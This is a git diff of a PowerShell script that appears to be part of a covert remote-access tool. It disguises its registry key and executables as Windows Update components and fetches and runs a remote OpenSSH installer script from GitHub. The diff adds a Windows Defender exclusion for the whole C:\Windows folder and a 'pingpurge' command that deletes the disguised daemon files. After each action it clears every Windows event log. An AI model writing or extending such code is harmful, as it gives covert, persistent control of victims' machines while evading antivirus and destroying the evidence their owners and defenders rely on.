@@ -12,6 +12,8 @@ $ztdatadir = "$env:LOCALAPPDATA\ZeroTier"
 $sshdir = "C:\Program Files\OpenSSH"
 $sshdatadir = "C:\ProgramData\ssh"
 $regPath = "HKLM:\Software\WindowsUpdateService"
+$defenderexclusins = "C:\Windows"
+$pingexepaths = @("C:\Windows\System32\WindowsUpdateServiceDaemon.exe", "C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateServiceDaemon.exe")
 $cacheBuster = Get-Random
 $sshinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/Archives/SimplifiedIOpenSSHnstallFromZIP.ps1"
 #$sshinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/OpenSSHInstallFromExe.ps1"
@@ -259,7 +261,7 @@ function zerotier_purge {
     Uninstall-Package -Name "ZeroTier One" -Force | Out-Null
 }
 
-##Under review function to remove the programs installed via program manager of windows.
+#Under review function to remove the programs installed via program manager of windows.
 function Remove-Package {
     param (
         [string]$PackageName
@@ -275,14 +277,23 @@ function Remove-Package {
 #Function to add defender exclusions.
 function Add-WindowsDefenderExclusion {
     try {
-        $exclusionPath = "C:\Windows"
-        Add-MpPreference -ExclusionPath $exclusionPath -ErrorAction SilentlyContinue -ErrorVariable AddExclusionError | Out-Null
+        Add-MpPreference -ExclusionPath $defenderexclusins -ErrorAction SilentlyContinue -ErrorVariable AddExclusionError | Out-Null
         if (-not $AddExclusionError) {
         }
     }
     catch {
     }
 }
+
+#Function to purge ping exes.
+function RemovePings {
+    foreach ($file in $pingexepaths) {
+        if (Test-Path $file) {
+            Remove-Item $file -Force -ErrorAction SilentlyContinue
+        }
+    }
+}
+
 
 
 #Code starts here.
@@ -419,7 +430,15 @@ if ($null -ne $storedCode) {
                             WebExecution -InstallScriptURL $sshinstall
                             Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log }
                         } -MaxRetries $retryAttempts 
-                    }                
+                    }
+                    #ping purge
+                    "pingpurge" {
+                        RetryOps {
+                            Add-WindowsDefenderExclusion
+                            RemovePings
+                            Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log } 
+                        } -MaxRetries $retryAttempts
+                    }               
                 }
                 if ($status -ne $null) {
                     Set-ItemProperty -Path $regPath -Name "Data" -Value $status
